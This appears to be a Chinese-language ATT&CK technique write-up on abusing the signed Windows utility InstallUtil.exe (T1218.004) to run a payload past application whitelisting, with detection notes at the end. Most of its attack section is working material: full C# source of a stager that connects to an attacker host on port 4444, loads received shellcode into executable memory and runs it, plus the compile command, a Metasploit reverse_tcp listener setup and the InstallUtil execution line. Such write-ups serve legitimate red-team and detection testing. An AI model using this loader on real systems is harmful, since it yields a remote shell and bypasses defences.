# T1218-004-win-基于白名单Installutil.exe执行payload

## 来自ATT&CK的描述

命令行实用程序InstallUtil可用于通过执行.NET二进制文件中指定的特定安装程序组件来安装和卸载资源。

InstallUtil位于Windows系统上的.NET目录中：

C:\Windows\Microsoft.NET\Framework\v\InstallUtil.exe

C:\Windows\Microsoft.NET\Framework64\v\InstallUtil.exe

InstallUtil.exe由Microsoft进行数字签名。攻击者可能会使用InstallUtil通过受信任的Windows实用程序来代理执行代码。攻击者还可以用Installutil来绕过进程白名单，方法是在二进制文件中使用属性，这些属性执行用属性[System.ComponentModel.RunInstaller(true)]修饰的类。

## 测试案例

说明：Installutil.exe所在路径没有被系统添加PATH环境变量中，因此，Installutil命令无法识别。

补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

## 检测日志

windows 安全日志/SYSMON日志（需要自行安装）

## 测试复现

### 环境准备

攻击机：Kali2019

靶机：windows server 2012

### 攻击分析

#### x64 CS

```cs
using System;using System.Net;using System.Linq;using System.Net.Sockets;using System.Runtime.InteropServices;using System.Threading;using System.Configuration.Install;using System.Windows.Forms;
public class GQLBigHgUniLuVx {
public static void Main()
{
while(true)
{{ MessageBox.Show("doge"); Console.ReadLine();}}
}
 }

 [System.ComponentModel.RunInstaller(true)]
 public class esxWUYUTWShqW : System.Configuration.Install.Installer
 {
 public override void Uninstall(System.Collections.IDictionary zWrdFAUHmunnu)
 {
 jkmhGrfzsKQeCG.LCIUtRN();
 }

 }
 public class jkmhGrfzsKQeCG
 { [DllImport("kernel")] private static extern UInt32 VirtualAlloc(UInt32 YUtHhF,UInt32 VenifEUR, UInt32 NIHbxnOmrgiBGL, UInt32 KIheHEUxhAfOI);
 [DllImport("kernel32")] private static extern IntPtr CreateThread(UInt32 GDmElasSZbx, UInt32 rGECFEZG, UInt32 UyBSrAIp,IntPtr sPEeJlufmodo, UInt32 jmzHRQU, ref UInt32 SnpQPGMvDbMOGmn);
 [DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr pRIwbzTTS, UInt32 eRLAWWYQnq);
 static byte[] ErlgHH(string ZwznjBJY,int KsMEeo) {
 IPEndPoint qAmSXHOKCbGlysd = new IPEndPoint(IPAddress.Parse(ZwznjBJY), KsMEeo);
 Socket XXxIoIXNCle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

 try { XXxIoIXNCle.Connect(qAmSXHOKCbGlysd); }
 catch { return null;}
 byte[] UmquAHRnhhpuE = new byte[4];
 XXxIoIXNCle.Receive(UmquAHRnhhpuE,4,0);
 int kFVRSNnpj = BitConverter.ToInt32(UmquAHRnhhpuE,0);
 byte[] qaYyFq = new byte[kFVRSNnpj +5];
 int SRCDELibA =0;
 while(SRCDELibA < kFVRSNnpj)
 { SRCDELibA += XXxIoIXNCle.Receive(qaYyFq, SRCDELibA +5,(kFVRSNnpj - SRCDELibA)<4096 ? (kFVRSNnpj - SRCDELibA) : 4096,0);}
 byte[] TvvzOgPLqwcFFv =BitConverter.GetBytes((int)XXxIoIXNCle.Handle);
 Array.Copy(TvvzOgPLqwcFFv,0, qaYyFq,1,4); qaYyFq[0]=0xBF;
 return qaYyFq;}
 static void cmMtjerv(byte[] HEHUjJhkrNS) {
 if(HEHUjJhkrNS !=null) {
 UInt32 WcpKfU = VirtualAlloc(0,(UInt32)HEHUjJhkrNS.Length,0x1000,0x40);
 Marshal.Copy(HEHUjJhkrNS,0,(IntPtr)(WcpKfU), HEHUjJhkrNS.Length);
 IntPtr UhxtIFnlOQatrk = IntPtr.Zero;
 UInt32 wdjYKFDCCf =0;
 IntPtr XVYcQxpp = IntPtr.Zero;
 UhxtIFnlOQatrk = CreateThread(0,0, WcpKfU, XVYcQxpp,0, ref wdjYKFDCCf);
 WaitForSingleObject(UhxtIFnlOQatrk,0xFFFFFFFF); }}
 public static void LCIUtRN() {

byte[] IBtCWU =null; IBtCWU = ErlgHH("192.168.126.146",4444);
cmMtjerv(IBtCWU);
} }

```

#### 编译payload

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:Micropoor.exe  /unsafe C:\Users\Administrator\Desktop\a\installutil.cs
```

![编译payload](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70-20220502155159117.png)

#### 执行监听

攻击机,注意配置set AutoRunScript migrate f (AutoRunScript是msf中一个强大的自动化的后渗透工具，这里migrate参数是迁移木马到其他进程)

```bash
msf5 > use exploits/multi/handler
msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.126.146
lhost => 192.168.126.146
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > exploit
```

![监听](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70-20220502155203457.png)

#### 执行payload

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U Micropoor.exe
```

#### 反弹shell

![执行payload](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200413152353294.png)

## 测试留痕

```bash
EventID:4688 #安全日志，windows server 2012以上配置审核策略，可对命令参数进行记录
```

![日志留痕](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70-20220502155214847.png)

## 检测规则/思路

无具体检测规则，可根据进程创建事件4688/1（进程名称、命令行）进行监控。本监控方法需要自行安装配置审核策略Sysmon。

## 参考推荐

MITRE-ATT&CK-T1218-004

<https://attack.mitre.org/techniques/T1218/004/>

基于白名单Installutil.exe执行payload

<https://micro8.gitbook.io/micro8/contents-1/71-80/72-ji-yu-bai-ming-dan-installutil.exe-zhi-hang-payload-di-er-ji>

基于白名单的Payload

<https://blog.csdn.net/weixin_30790841/article/details/101848854>
